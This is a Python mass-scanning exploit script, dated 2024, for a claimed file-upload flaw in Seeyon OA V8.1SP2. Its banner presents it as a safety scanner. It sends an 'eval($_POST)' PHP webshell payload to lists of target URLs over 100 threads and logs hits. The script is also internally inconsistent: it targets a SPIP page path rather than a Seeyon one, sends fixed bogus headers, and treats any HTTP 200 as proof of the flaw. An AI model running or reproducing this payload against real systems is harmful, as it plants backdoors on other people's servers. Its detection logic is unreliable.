# 致远OA_V8.1SP2文件上传漏洞
# 导包外置
import requests, argparse, sys
from multiprocessing.dummy import Pool

# 关闭告警
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 致远OA_V8.1SP2文件上传漏洞安全漏洞扫描工具                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-9-13  
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OA_V8.1SP2文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload = '/spip/spip.php?page=spip_pass'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'User-Agent': 'Cozilla/5.0(VindowsEt6.1;Sow64,rident/7.0;ry:11.0)',
        'Accept-Encoding': 'gzip,deflate',
        'Cookie': 'JSESSIONID=5bGx5rW35LmL5YWz',
        'Cache-Control': 'no-cache',
        'Content-Encoding': 'deflate',
        'Accept': 'text/html，image/gif,image/jpeg，*;q=.2,*/*;q=.2',
        'Content-Length': '522729',
        'Connection': 'close'

    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = 'arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":"","sample":"<?php @eval($_POST[123]);?>"}'

    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, timeout=10, verify=False,
                             proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在任意文件上传漏洞")
            with open('result39.txt', 'a', encoding='utf-8') as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f'[-]该url:{target}不存在任意文件上传漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')


if __name__ == '__main__':
    main()